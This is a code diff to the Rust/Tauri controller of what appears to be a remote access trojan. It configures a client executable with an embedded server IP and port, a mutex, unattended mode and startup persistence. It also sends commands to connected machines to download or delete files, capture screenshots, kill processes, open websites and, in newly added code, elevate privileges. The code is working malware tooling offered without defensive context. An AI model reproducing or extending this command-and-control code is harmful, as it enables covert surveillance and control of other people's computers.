@@ -1,13 +1,12 @@
 use tauri::State;
 use crate::handlers::{ SharedServer, SharedTauriState, FrontClient, TauriState };
-use common::commands::{ Command, File as FileData, Process };
+use common::commands::{ Command, File as FileData, Process, VisitWebsiteData };
 
 use serde::Serialize;
-use object::{Object, ObjectSection};
-use std::fs::{self, File};
+use object::{ Object, ObjectSection };
+use std::fs::{ self, File };
 use std::io::Write;
 use std::vec;
-
 
 use rmp_serde::Serializer;
 
@@ -40,7 +39,14 @@ pub fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> TauriState {
 }
 
 #[tauri::command]
-pub fn build_client(ip: &str, port: &str, mutex_enabled: bool, mutex: &str, unattended_mode: bool, startup: bool) {
+pub fn build_client(
+    ip: &str,
+    port: &str,
+    mutex_enabled: bool,
+    mutex: &str,
+    unattended_mode: bool,
+    startup: bool
+) {
     let bin_data = fs::read("target/debug/client.exe").unwrap();
     let file = object::File::parse(&*bin_data).unwrap();
 
@@ -52,7 +58,7 @@ pub fn build_client(ip: &str, port: &str, mutex_enabled: bool, mutex: &str, unat
         mutex_enabled,
         mutex: mutex.to_string(),
         unattended_mode,
-        startup
+        startup,
     };
 
     let mut buffer: Vec<u8> = Vec::new();
@@ -199,7 +205,10 @@ pub fn manage_file(
 
     match run {
         "download_file" => {
-            client.write_buffer(Command::DownloadFile(file.to_string()), &Some(client.get_secret()));
+            client.write_buffer(
+                Command::DownloadFile(file.to_string()),
+                &Some(client.get_secret())
+            );
         }
         "remove_file" => {
             client.write_buffer(Command::RemoveFile(file.to_string()), &Some(client.get_secret()));
@@ -224,7 +233,10 @@ pub fn take_screenshot(id: &str, display: i32, server_state: State<'_, SharedSer
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
 
-    client.write_buffer(Command::ScreenshotDisplay(display.to_string()), &Some(client.get_secret()));
+    client.write_buffer(
+        Command::ScreenshotDisplay(display.to_string()),
+        &Some(client.get_secret())
+    );
 }
 
 #[tauri::command]
@@ -320,17 +332,16 @@ pub fn kill_process(
     let mut clients = server.clients.lock().unwrap();
     let client = clients.get_mut(client_id).unwrap();
 
-    client.write_buffer(Command::KillProcess(Process {pid, name: name.to_string()}), &Some(client.get_secret()));
+    client.write_buffer(
+        Command::KillProcess(Process { pid, name: name.to_string() }),
+        &Some(client.get_secret())
+    );
 
     "true".to_string()
 }
 
 #[tauri::command]
-pub fn manage_client(
-    id: &str,
-    run: &str,
-    server_state: State<'_, SharedServer>
-) {
+pub fn manage_client(id: &str, run: &str, server_state: State<'_, SharedServer>) {
     println!("doing sometihing");
     let server = server_state.0.lock().unwrap();
 
@@ -346,7 +357,36 @@ pub fn manage_client(
         "reconnect" => {
             client.write_buffer(Command::Reconnect, &Some(client.get_secret()));
         }
-        _ => {
-        }
+        _ => {}
     }
+}
+
+#[tauri::command]
+pub fn visit_website(id: &str, url: &str, server_state: State<'_, SharedServer>) {
+    let server = server_state.0.lock().unwrap();
+
+    let client_id = id.parse::<usize>().unwrap();
+
+    let mut clients = server.clients.lock().unwrap();
+    let client = clients.get_mut(client_id).unwrap();
+
+    client.write_buffer(
+        Command::VisitWebsite(VisitWebsiteData {
+            visit_type: "normal".to_string(),
+            url: url.to_string(),
+        }),
+        &Some(client.get_secret())
+    );
+}
+
+#[tauri::command]
+pub fn elevate_client(id: &str, server_state: State<'_, SharedServer>) {
+    let server = server_state.0.lock().unwrap();
+
+    let client_id = id.parse::<usize>().unwrap();
+
+    let mut clients = server.clients.lock().unwrap();
+    let client = clients.get_mut(client_id).unwrap();
+
+    client.write_buffer(Command::ElevateClient, &Some(client.get_secret()));
 }
